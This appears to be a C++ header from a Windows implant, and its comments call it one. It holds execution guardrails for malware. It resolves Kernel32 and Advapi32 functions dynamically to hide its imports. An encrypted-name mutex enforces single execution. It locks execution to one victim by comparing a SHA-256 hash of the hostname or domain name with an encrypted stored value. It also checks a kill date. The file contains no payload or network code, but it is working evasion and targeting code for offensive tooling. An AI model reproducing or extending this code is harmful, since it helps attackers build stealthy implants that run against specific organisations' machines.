#pragma once

#include <Windows.h>
#include <Lmcons.h>
#include <wincrypt.h>
#include <string>
#include "Config.h"
#include "Helpers.h"

// Function prototypes
// ------------------------------------------------------------------------

typedef HANDLE(WINAPI* _CreateMutexA)(
	LPSECURITY_ATTRIBUTES lpMutexAttributes,
    BOOL                  bInitialOwner,
    LPCSTR                lpName
    );

typedef BOOL(WINAPI* _GetComputerNameExA)(
    COMPUTER_NAME_FORMAT NameType,
    LPSTR                lpBuffer,
    LPDWORD              nSize
    );

typedef BOOL(WINAPI* _CryptGetHashParam)(
	HCRYPTHASH hHash,
  	DWORD      dwParam,
  	BYTE       *pbData,
  	DWORD      *pdwDataLen,
  	DWORD      dwFlags
  	);

typedef void(WINAPI* _GetSystemTime)(
	LPSYSTEMTIME lpSystemTime
	);

// To retrieve Hostname/Domainname
// ------------------------------------------------------------------------

std::string get_name(COMPUTER_NAME_FORMAT name) {
	// Dynamically resolve the API functions from Kernel32
    HMODULE Kernel32 = GetModuleHandleA("Kernel32.dll");
    _GetComputerNameExA GetComputerNameExA = (_GetComputerNameExA)GetProcAddress(Kernel32, "GetComputerNameExA");
    if (GetComputerNameExA == NULL) {
        return "";
    }

    // Init some important variables
    LPSTR lpBuffer[MAX_PATH];
    DWORD dwLength = UNLEN+1;
    ZeroMemory(lpBuffer, MAX_PATH);

    // Retrieve name
    BOOL ok = GetComputerNameExA(name, (LPSTR)lpBuffer, &dwLength);
    if (!ok)
        return "";
    else if (strlen((LPCSTR)lpBuffer) == 0)
        return "NODJ";
    else {
        std::string hn((LPSTR)lpBuffer);
        return hn;
    }
}

// SHA-256 hash a given string
// ------------------------------------------------------------------------

std::string hash_data(std::string data) {
	// Dynamically resolve the API functions from Advapi32
    HMODULE Advapi32 = LoadLibraryA("Advapi32.dll");

    _CryptAcquireContextW CryptAcquireContextW = (_CryptAcquireContextW)
        GetProcAddress(Advapi32, "CryptAcquireContextW");
    if (CryptAcquireContextW == NULL) {
        return "";
    }

    _CryptCreateHash CryptCreateHash = (_CryptCreateHash)
        GetProcAddress(Advapi32, "CryptCreateHash");
    if (CryptCreateHash == NULL) {
        return "";
    }

    _CryptHashData CryptHashData = (_CryptHashData)
        GetProcAddress(Advapi32, "CryptHashData");
    if (CryptHashData == NULL) {
        return "";
    }

    _CryptGetHashParam CryptGetHashParam = (_CryptGetHashParam)
        GetProcAddress(Advapi32, "CryptGetHashParam");
    if (CryptGetHashParam == NULL) {
        return "";
    }

    _CryptDestroyHash CryptDestroyHash = (_CryptDestroyHash)
        GetProcAddress(Advapi32, "CryptDestroyHash");
    if (CryptDestroyHash == NULL) {
        return "";
    }

    _CryptReleaseContext CryptReleaseContext = (_CryptReleaseContext)
        GetProcAddress(Advapi32, "CryptReleaseContext");
    if (CryptReleaseContext == NULL) {
        return "";
    }

    // Init some important stuff
    HCRYPTPROV cryptProv;
    HCRYPTHASH cryptHash;
    DWORD hashSize = 32;
    BYTE hash[32];
    LPSTR hex = "0123456789abcdef";
    LPSTR hashHex = (LPSTR)malloc(500);
    memset(hashHex, '\0', 500);

    if (!CryptAcquireContextW(&cryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return "";
    }

    if (!CryptCreateHash(cryptProv, CALG_SHA_256, 0, 0, &cryptHash)) {
        return "";
    }

    if (!CryptHashData(cryptHash, (BYTE*)data.c_str(), data.length(), 0)) {
        return "";
    }

    if (!CryptGetHashParam(cryptHash, HP_HASHVAL, hash, &hashSize, 0)) {
        return "";
    }

    // Convert hash byte blob to hex
    for (int i = 0; i < hashSize; i++) {
        hashHex[i * 2] = hex[hash[i] >> 4];
        hashHex[(i * 2) + 1] = hex[hash[i] & 0xF];
    }

    // Cleanup
    CryptReleaseContext(cryptProv, 0);
    CryptDestroyHash(cryptHash);

    return std::string(hashHex);
}

// Enforce Single Execution of implant with a mutex
// ------------------------------------------------------------------------

BOOL check_mutex() {
	// Dynamically resolve the API functions from Kernel32
    HMODULE Kernel32 = GetModuleHandleA("Kernel32.dll");
    _CreateMutexA CreateMutexA = (_CreateMutexA)GetProcAddress(Kernel32, "CreateMutexA");
    if (CreateMutexA == NULL) {
        return TRUE;
    }

	// Init some important variables
	HANDLE mutex = NULL;
	long error = NULL;

    // Attempt to create a mutex
    std::string mutexName = decrypt_string(MUTEX_NAME);
	mutex = CreateMutexA(NULL, FALSE, mutexName.c_str());

	// Get error
	error = GetLastError();

    // Check if mutex already exists
	if (error == ERROR_ALREADY_EXISTS) {
		CloseHandle(mutex);
		return FALSE;
	}

	return TRUE;
}

// Validate endpoint using hashed value of the host artifact(Hostname/Domainname)
// ------------------------------------------------------------------------

BOOL validate_endpoint() {
    // Init some important stuff
    std::string artifact;
    std::string artifactHash;

#ifdef WORKSTATION
    // Get host name if target is not domain joined
    artifact = get_name(ComputerNamePhysicalNetBIOS);
#else
	// Attempt to get domain name
	artifact = get_name(ComputerNamePhysicalDnsDomain);
#endif

	// Hash the value
	artifactHash = hash_data(artifact);

    // Decrypt hash string
    std::string hostArtifact = decrypt_string(HOST_ARTIFACT);

    // Compare hash values
	if (artifactHash == hostArtifact)
		return TRUE;
	else
		return FALSE;
}

// Check if current date has exceeded kill date
// ------------------------------------------------------------------------

BOOL check_killdate() {
	// Dynamically resolve the API functions from Kernel32
    HMODULE Kernel32 = GetModuleHandleA("Kernel32.dll");
    _GetSystemTime GetSystemTime = (_GetSystemTime)GetProcAddress(Kernel32, "GetSystemTime");
    if (GetSystemTime == NULL) {
        return TRUE;
    }

    // Init some important stuff
    SYSTEMTIME ct;

    // Get system date
    GetSystemTime(&ct);
    WORD day = ct.wDay;
	WORD month = ct.wMonth;
	WORD year = ct.wYear;

	// Validate against the kill date
	if (year < YEAR) return TRUE;
	else if (year == YEAR && month < MONTH) return TRUE;
	else if (year == YEAR && month == MONTH && day < DAY) return TRUE;

	return FALSE;
}